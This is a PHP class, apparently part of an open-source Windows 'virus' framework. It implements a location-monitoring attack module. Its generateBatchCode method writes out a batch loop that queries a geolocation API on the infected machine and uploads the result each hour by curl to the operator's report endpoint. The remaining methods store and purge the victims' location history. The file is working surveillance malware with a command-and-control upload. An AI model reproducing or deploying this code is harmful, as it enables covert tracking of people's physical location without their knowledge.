<?php

namespace Kelvinho\Virus\Attack\Packages\Windows\Background\MonitorLocation;

use Kelvinho\Virus\Attack\AttackBase;

/**
 * Class MonitorLocation. Monitors the location every time interval. Currently it is set to half an hour.
 *
 * Structure of an event saved on disk:
 * events => {
 *   "{unix time}" => {
 *     "lat" => "{latitude}",
 *     "lng" => "{longitude}",
 *     "acc" => "{accuracy}"
 *     "name" => "{name}"
 *   }
 * }
 * And saved events are just a single unix timestamp, and all information is stored in events
 *
 * Structure of an event returned by the virus:
 * {
 *   "location": {
 *     "lat": {latitude},
 *     "lng": {longitude}
 *   },
 *   "accuracy": {accuracy}
 * }
 *
 * @package Kelvinho\Virus\Attack\Packages\Windows\Background\MonitorLocation
 * @author Quang Ho <157239q@gmail.com>
 * @copyright Copyright (c) 2020 Quang Ho <https://github.com/157239n>
 * @license http://www.opensource.org/licenses/mit-license.html  MIT License
 */
class MonitorLocation extends AttackBase {
    private array $events = [];
    private array $savedEvents = [];

    public function getEvents(): array {
        return $this->events;
    }

    public function setEvents($events) {
        $this->events = $events;
    }

    public function saveEventFromIntercept(string $jsonEvent) {
        $event = json_decode($jsonEvent, true);
        $this->events[time()] = array(
            "lat" => $event["location"]["lat"],
            "lng" => $event["location"]["lng"],
            "acc" => $event["accuracy"],
            "name" => $event["name"] ?? ""
        );
    }

    public function updateEventFromController(string $jsonEvent, string $unixTime): MonitorLocation {
        $event = json_decode($jsonEvent);
        $this->events[$unixTime] = $event;
        return $this;
    }

    /**
     * @return array An array containing all the unix timestamps that the user would like to save
     */
    public function getSavedEvents(): array {
        return $this->savedEvents;
    }

    public function setSavedEvents(string $jsonSavedEvents): MonitorLocation {
        $this->savedEvents = json_decode($jsonSavedEvents, true);
        return $this;
    }

    public function generateBatchCode(): void {
        //@formatter:off ?>
        :daemon_loop
        curl -d "{}" -H "Content-Type: application/json" "https://www.googleapis.com/geolocation/v1/geolocate?key=<?php echo getenv("GOOGLE_GEOLOCATION_API_KEY"); ?>">"%~pd0geo"
        curl --form "geoFile=@%~pd0geo" --post301 --post302 --post303 -L <?php echo ALT_SECURE_DOMAIN . "/vrs/$this->virus_id/aks/$this->attack_id/report\n"; ?>
        timeout 3600
        goto daemon_loop
        <?php
        //@formatter:on
    }

    public function processExtras(string $resourceIdentifier): void {
    }

    protected function setState(string $json): void {
        $state = json_decode($json, true);
        $this->events = $state["events"] ?? [];
        $this->savedEvents = $state["savedEvents"] ?? [];
        asort($this->savedEvents);
    }

    protected function getState(): string {
        //$this->purgeEvents();
        $state = [];
        $state["events"] = $this->events;
        $state["savedEvents"] = $this->savedEvents;
        return json_encode($state);
    }

    public function purgeEvents() {
        foreach ($this->events as $unixTime => $event) {
            if (in_array($unixTime, $this->savedEvents)) continue;
            if (time() - $unixTime > 24 * 60 * 60) unset($this->events[$unixTime]);
        }
    }
}
